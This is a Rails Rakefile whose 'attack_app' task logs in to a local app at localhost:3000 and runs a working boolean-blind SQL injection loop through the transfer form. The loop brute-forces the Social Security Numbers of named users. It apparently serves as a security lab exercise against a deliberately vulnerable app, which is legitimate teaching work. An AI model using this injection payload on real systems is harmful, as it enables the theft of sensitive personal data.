# Add your own tasks in files placed in lib/tasks ending in .rake,
# for example lib/tasks/capistrano.rake, and they will automatically be available to Rake.
require 'mechanize'

require File.expand_path('../config/application', __FILE__)

Rails.application.load_tasks

task :attack_app do

  #Initial Setup Before Attack Begins
  agent = Mechanize.new
  page = agent.get('http://localhost:3000')
  form = page.forms.first
  form['username'] = 'bill@example.com'
  form['password'] = 'Microsoft'
  page = form.submit
  link = page.link_with(:text => "Quick Transfer")
  page = link.click

  #Start Attack
  ['Bill Gates', 'Larry Ellison', 'Warren Buffet'].each do |name|
    (8238128872...9238128872).each do |num|
      page = agent.get('http://localhost:3000/transactions/new')
      form = page.forms.last
      form['to'] = "') or (SELECT 1 FROM 'users' WHERE name = '#{name}' AND ssn = '#{num}')--"
      form['amount'] = '1'
      page = form.submit
      alert = page.search "div.alert p"
      if alert.first.to_s =~ /Succeeded!/
        p "#{name}'s Social Security Number is #{num}"
      else
        p "it doesn't work -- #{num}" if num % 50000 == 0
      end
    end
  end
end
